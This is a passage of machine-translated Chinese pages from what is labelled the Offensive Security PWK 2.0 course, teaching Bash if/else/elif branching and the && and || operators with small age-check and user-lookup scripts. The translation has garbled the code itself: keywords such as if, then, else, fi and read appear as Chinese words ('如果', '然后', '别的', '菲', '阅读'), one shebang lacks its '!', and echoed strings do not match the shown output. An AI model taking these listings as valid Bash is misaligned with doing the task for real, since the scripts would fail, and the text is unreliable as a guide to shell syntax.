<div style="position:absolute;top:132442;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "欢迎来到课程！"</font></font></nobr></div>
<div style="position:absolute;top:132459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">菲</font></font></nobr></div>
<div style="position:absolute;top:132493;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./else.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:132527;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./else.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:132544;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你的年龄：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21</font></font></font></b></nobr></div>
<div style="position:absolute;top:132561;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">欢迎来到课程！</font></font></nobr></div>
<div style="position:absolute;top:132580;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 150 - 在 Bash 中使用 else 语句</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:132609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，</font><font style="vertical-align: inherit;">当输入的年龄大于（或更多）时执行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">else</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句</font></font></nobr></div>
<div style="position:absolute;top:132629;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特别是“不少于”）十六。</font></font></nobr></div>
<div style="position:absolute;top:132661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，如果</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报表只允许两个执行代码分支。</font><font style="vertical-align: inherit;">我们可以添加额外的</font></font></nobr></div>
<div style="position:absolute;top:132681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用以下模式</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">elif</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句</font><font style="vertical-align: inherit;">分支</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:132716;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 [ &lt;一些测试&gt; ]</font></font></nobr></div>
<div style="position:absolute;top:132733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后</font></font></nobr></div>
<div style="position:absolute;top:132750;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;执行操作&gt;</font></font></nobr></div>
<div style="position:absolute;top:132767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">elif [ &lt;一些测试&gt; ]</font></font></nobr></div>
<div style="position:absolute;top:132784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后</font></font></nobr></div>
<div style="position:absolute;top:132800;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;执行不同的动作&gt;</font></font></nobr></div>
<div style="position:absolute;top:132818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别的</font></font></nobr></div>
<div style="position:absolute;top:132835;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;执行另一个不同的动作&gt;</font></font></nobr></div>
<div style="position:absolute;top:132852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">菲</font></font></nobr></div>
<div style="position:absolute;top:132871;left:358"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 151 - Bash 中的 elif 语法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:132900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们再次扩展我们的“age”示例以包含</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">elif</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:132935;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./elif.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:132952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:132969;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># elif 示例</font></font></nobr></div>
<div style="position:absolute;top:133003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阅读 -p "你的年龄：" age</font></font></nobr></div>
<div style="position:absolute;top:133037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 [ $age -lt 16 ]</font></font></nobr></div>
<div style="position:absolute;top:133054;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后</font></font></nobr></div>
<div style="position:absolute;top:133071;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "你可能需要家长的许可才能参加这门课程！"</font></font></nobr></div>
<div style="position:absolute;top:133088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">elif [ $age -gt 60 ]</font></font></nobr></div>
<div style="position:absolute;top:133105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:133231;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="113"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 113 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:133264;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:134341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:134341;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:134341;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">113</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:133360;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo “向你致敬，尊敬！”</font></font></nobr></div>
<div style="position:absolute;top:133376;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别的</font></font></nobr></div>
<div style="position:absolute;top:133393;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "欢迎来到课程！"</font></font></nobr></div>
<div style="position:absolute;top:133410;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">菲</font></font></nobr></div>
<div style="position:absolute;top:133444;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./elif.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:133478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./elif.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:133495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你的年龄：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">65</font></font></font></b></nobr></div>
<div style="position:absolute;top:133512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">向你致敬，敬佩！</font></font></nobr></div>
<div style="position:absolute;top:133532;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 152 - 在 Bash 中使用 elif 语句</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:133561;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个例子中，代码执行流程稍微复杂一些。</font><font style="vertical-align: inherit;">按照操作顺序，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后</font></font></i></nobr></div>
<div style="position:absolute;top:133580;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果输入的年龄小于 16 岁，则执行</font><font style="vertical-align: inherit;">分支，进入</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">elif</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分支（并且“帽子”</font></font></nobr></div>
<div style="position:absolute;top:133600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">off..” 消息）如果年龄大于 60，并且 else 分支仅在</font></font></nobr></div>
<div style="position:absolute;top:133619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">年龄大于十六但小于六十。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:133656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.4 布尔逻辑运算</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:133698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">布尔逻辑运算符，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">118个</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">像</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AND</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (&amp;&amp;)和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OR</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (||)有点神秘，因为Bash</font></font></nobr></div>
<div style="position:absolute;top:133717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以多种方式使用它们。</font></font></nobr></div>
<div style="position:absolute;top:133750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一种常见的用途是在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令列表中</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它是命令链，其流程由</font></font></nobr></div>
<div style="position:absolute;top:133769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运营商。</font><font style="vertical-align: inherit;">“|” </font><font style="vertical-align: inherit;">(pipe) 符号是命令列表中的常用操作符，通过</font></font></nobr></div>
<div style="position:absolute;top:133789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个命令的输出到另一个命令的输入。</font><font style="vertical-align: inherit;">类似地，布尔逻辑运算符执行</font></font></nobr></div>
<div style="position:absolute;top:133808;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令基于上一个命令是成功（或返回 True 或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）还是失败</font></font></nobr></div>
<div style="position:absolute;top:133827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（返回 False 或非零）。</font></font></nobr></div>
<div style="position:absolute;top:133860;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们先看一下</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AND</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (&amp;&amp;) 布尔运算符，它仅在以下情况下才执行命令</font></font></nobr></div>
<div style="position:absolute;top:133880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上一个命令成功（或返回 True 或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:133915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user2=kali</font></font></font></b></nobr></div>
<div style="position:absolute;top:133948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep $user2 /etc/passwd &amp;&amp; echo "$user2 found!"</font></font></font></b></nobr></div>
<div style="position:absolute;top:133965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali:x:1000:1000:,,,:/home/kali:/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:133982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利找到了！</font></font></nobr></div>
<div style="position:absolute;top:134017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user2=bob</font></font></font></b></nobr></div>
<div style="position:absolute;top:134050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep $user2 /etc/passwd &amp;&amp; echo "$user2 found!"</font></font></font></b></nobr></div>
<div style="position:absolute;top:134086;left:262"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 153 - 在命令列表中使用 AND (&amp;&amp;) 布尔运算符</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:134116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个例子中，我们首先将我们正在搜索的用户名分配给</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user2</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量。</font><font style="vertical-align: inherit;">下一个，</font></font></nobr></div>
<div style="position:absolute;top:134135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令来检查某个用户是否列在 /etc/passwd 文件中，如果是，</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:134155;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回</font></font></font><i><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">True</font></font></font></i><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并执行</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">但是，当我们尝试搜索用户时</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:134174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们知道 /etc/passwd 文件中不存在，我们的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令没有被执行。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:134291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">118 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（麻省理工学院），https://libguides.mit.edu/c.php?g=175963&amp;p=1158594</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:134419;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="114"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 114 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:134452;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:135529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:135529;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:135529;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">114</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:134548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在命令列表中使用时，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OR</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (||) 运算符与</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AND</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (&amp;&amp;)</font><font style="vertical-align: inherit;">运算符相反</font><font style="vertical-align: inherit;">；</font><font style="vertical-align: inherit;">它执行下一个</font></font></nobr></div>
<div style="position:absolute;top:134567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅当上一个命令失败时才发出命令（返回 False 或非零）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:134602;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $user2</font></font></font></b></nobr></div>
<div style="position:absolute;top:134619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">鲍勃</font></font></nobr></div>
<div style="position:absolute;top:134653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep $user2 /etc/passwd &amp;&amp; echo "$user2 found!" </font><font style="vertical-align: inherit;">|| </font><font style="vertical-align: inherit;">echo "$user2 未找到</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:134670;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">！”</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:134687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找不到鲍勃！</font></font></nobr></div>
<div style="position:absolute;top:134706;left:272"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 154 - 在命令列表中使用 OR (||) 布尔运算符</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:134735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在上面的示例中，我们将之前的命令更进一步，并添加了</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OR</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (||) 运算符</font></font></nobr></div>
<div style="position:absolute;top:134755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接着是第二个</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">现在，当</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找不到匹配的行并返回时</font></font></nobr></div>
<div style="position:absolute;top:134774;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">False</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font><font style="vertical-align: inherit;">执行</font><i><font style="vertical-align: inherit;">OR</font></i><font style="vertical-align: inherit;"> (||) 运算符</font><font style="vertical-align: inherit;">之后</font><font style="vertical-align: inherit;">的第二个</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">。</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:134807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些运算符也可用于</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以比较变量或其他测试的结果。</font><font style="vertical-align: inherit;">什么时候</font></font></nobr></div>
<div style="position:absolute;top:134826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以这种方式使用，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AND</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (&amp;&amp;) 组合了两个简单的条件，如果它们都</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真，则组合</font></font></nobr></div>
<div style="position:absolute;top:134846;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果是成功（或 True 或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font></font></nobr></div>
<div style="position:absolute;top:134879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑这个例子：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:134914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./and.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:134931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:134947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 和例子</font></font></nobr></div>
<div style="position:absolute;top:134981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if [ $USER == 'kali' ] &amp;&amp; [ $HOSTNAME == 'kali' ]</font></font></nobr></div>
<div style="position:absolute;top:134999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后</font></font></nobr></div>
<div style="position:absolute;top:135016;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "多项说法属实！"</font></font></nobr></div>
<div style="position:absolute;top:135032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">别的</font></font></nobr></div>
<div style="position:absolute;top:135049;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "这里没什么可看的......"</font></font></nobr></div>
<div style="position:absolute;top:135066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">菲</font></font></nobr></div>
<div style="position:absolute;top:135100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./and.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:135134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./and.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:135151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多项说法属实！</font></font></nobr></div>
<div style="position:absolute;top:135185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $USER &amp;&amp; echo $HOSTNAME</font></font></font></b></nobr></div>
<div style="position:absolute;top:135202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利</font></font></nobr></div>
<div style="position:absolute;top:135219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利</font></font></nobr></div>
<div style="position:absolute;top:135238;left:218"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 155 - 使用 and (&amp;&amp;) 布尔运算符在 Bash 中测试多个条件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:135268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个例子中，我们使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AND</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (&amp;&amp;) 来测试多个条件，因为两个变量比较</font></font></nobr></div>
<div style="position:absolute;top:135287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是真的，整个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行成功，所以</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">then</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分支执行。</font></font></nobr></div>
<div style="position:absolute;top:135320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">test 中</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用时</font><font style="vertical-align: inherit;">，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OR</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (||) 布尔运算符用于测试一个或多个条件，但</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅</font></font></i></nobr></div>
<div style="position:absolute;top:135339;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其中之一</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必须是真实的才能算作成功。</font></font></nobr></div>
<div style="position:absolute;top:135372;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们来看一个例子：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:135407;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./or.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:135424;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:135441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 或示例</font></font></nobr></div>
<div style="position:absolute;top:135475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">if [ $USER == 'kali' ] || </font><font style="vertical-align: inherit;">[ $HOSTNAME == 'pwn' ]</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:135607;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="115"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 115 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
